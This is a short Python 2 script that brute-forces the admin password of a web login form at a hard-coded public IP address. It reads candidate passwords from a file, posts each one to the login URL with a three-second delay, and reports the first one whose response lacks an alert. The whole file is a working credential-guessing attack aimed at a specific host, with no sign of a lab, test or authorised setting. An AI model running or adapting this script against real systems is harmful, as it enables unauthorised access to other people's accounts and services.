#encoding:utf-8
import io
import requests
import re
import time


passlist = []
with open("password.txt") as f:
    for x in f.readlines():
        #print x.strip()
        passlist.append(x.strip())
f.close()
#print passlist

def BruteCheck():
    print "Strart BuuteForce---------"
    for x in passlist:
        payload={'username':'admin','password':str(x),'IbtnEnter':'%E7%99%BB%E5%BD%95'}
        print "try %s" %str(x)
        res = requests.post("http://223.202.31.199:8080/user/login",data=payload)
 #       print res.text
        time.sleep(3)
        if not re.findall("alert",res.text):
            print '[+]The pass is '+x
            return
    print "[-]pass not found"
BruteCheck()

